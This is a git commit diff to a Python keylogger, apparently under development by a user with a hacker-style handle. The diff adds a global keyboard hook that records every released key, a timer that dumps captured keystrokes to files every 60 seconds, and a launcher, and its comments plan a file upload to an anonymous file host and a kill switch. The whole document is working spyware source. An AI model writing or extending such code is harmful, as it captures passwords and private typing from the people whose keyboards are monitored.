f651f2f98df83c9f67fd33424bc22eb59c6db897
sc4r3d0ntf34r <sc4r3d0ntf34r@localhost.localdomain>
2023-09-20 03:15:40 -0400

    keylogger is functional, need to add file upload and kill switch

--- main.py
+++ main.py
@@ -4,11 +4,6 @@ import keyboard
 from threading import Timer, Thread
 from datetime import datetime
 
-# imports for sending email
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-
 #send report ever x seconds
 REPORT_TIMER = 60
 
@@ -44,13 +39,21 @@ class keyLogger:
 				name = "."
 			#for other special keys just change to uppercase and place an underscore
 			else:
-				name = name.replace(" ", "_"),upper()
+				name = name.replace(" ", "_").upper()
 
 		#add key to log
 		self.log += name
 
+	def startLog(self):
+		self.start = datetime.now()
+		# start the keylogging event listener
+		keyboard.on_release(callback=self.callback)
+		self.report()
+		msg.info(f"{datetime.now()} -- Keylogger has started")
+		keyboard.wait()
+
 	#methods for storing output to local files
-	def filename(self):
+	def genfilename(self):
 		fn_date_start = str(self.start)[:-7].replace(" ", "_").replace(":", "")
 		fn_date_end = str(self.end)[:-7].replace(" ", "_").replace(":", "")
 		self.filename = f"keylog - {fn_date_start}---{fn_date_end}"
@@ -59,6 +62,31 @@ class keyLogger:
 		with open(f"{self.filename}.txt", 'w') as f:
 			f.write(self.log)
 		msg.good("Log file has been saved!")
+
+	def report(self):
+		"""Functiom that reports to file
+		todo:
+		-use random string instead of datetime
+		-add upload to anonfiles
+		"""
+
+		# Check if there is something to log
+		if(self.log):
+			self.end = datetime.now()
+			self.genfilename()
+			self.log_keystrokes()
+			# Add file upload here
+			msg.good("Log file has been reported")
+
+		# create new log
+		self.log = ""
+		# new start date
+		self.start = datetime.now()
+		timer = Timer(interval=self.interval, function=self.report)
+		timer.daemon = True
+		timer.start()
+
+
 
 
 def print_banner():
@@ -81,3 +109,8 @@ def print_banner():
 
 if __name__ == '__main__':
 	print_banner()
+	keylogger = keyLogger(REPORT_TIMER)
+	try:
+		keylogger.startLog()
+	except KeyboardInterrupt:
+		msg.fail("keylogger has stoped")
